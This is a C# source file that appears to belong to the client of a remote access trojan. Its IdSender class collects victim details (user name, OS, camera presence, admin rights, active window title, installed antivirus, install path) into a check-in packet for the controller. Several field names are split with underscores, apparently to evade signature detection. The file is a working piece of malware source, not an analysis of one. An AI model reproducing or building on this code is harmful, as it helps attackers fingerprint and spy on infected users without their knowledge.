﻿using System;
using System.Diagnostics;
using System.IO;
using System.Windows.Forms;
using MessagePackLib.MessagePack;
using Microsoft.VisualBasic.Devices;

namespace Client.Helper
{
    public static class IdSender
    {
        public static byte[] SendInfo()
        {
            var msgpack = new MsgPack();
            msgpack.ForcePathObject("Pac_ket").AsString = "ClientInfo";
            msgpack.ForcePathObject("HWID").AsString = Settings.Hw_id;
            msgpack.ForcePathObject("User").AsString = Environment.UserName;
            msgpack.ForcePathObject("OS").AsString = new ComputerInfo().OSFullName.Replace("Microsoft", null) + " " +
                                                     Environment.Is64BitOperatingSystem.ToString()
                                                         .Replace("True", "64bit").Replace("False", "32bit");
            msgpack.ForcePathObject("Camera").AsString = Camera.havecamera().ToString();
            msgpack.ForcePathObject("Path").AsString = Process.GetCurrentProcess().MainModule.FileName;
            msgpack.ForcePathObject("Version").AsString = Settings.Ver_sion;
            msgpack.ForcePathObject("Admin").AsString = Methods.IsAdmin().ToString().ToLower().Replace("true", "Admin")
                .Replace("false", "User");
            msgpack.ForcePathObject("Perfor_mance").AsString = Methods.GetActiveWindowTitle();
            msgpack.ForcePathObject("Paste_bin").AsString = Settings.Paste_bin;
            msgpack.ForcePathObject("Anti_virus").AsString = Methods.Antivirus();
            msgpack.ForcePathObject("Install_ed").AsString =
                new FileInfo(Application.ExecutablePath).LastWriteTime.ToUniversalTime().ToString();
            msgpack.ForcePathObject("Po_ng").AsString = "";
            msgpack.ForcePathObject("Group").AsString = Settings.Group;
            return msgpack.Encode2Bytes();
        }
    }
}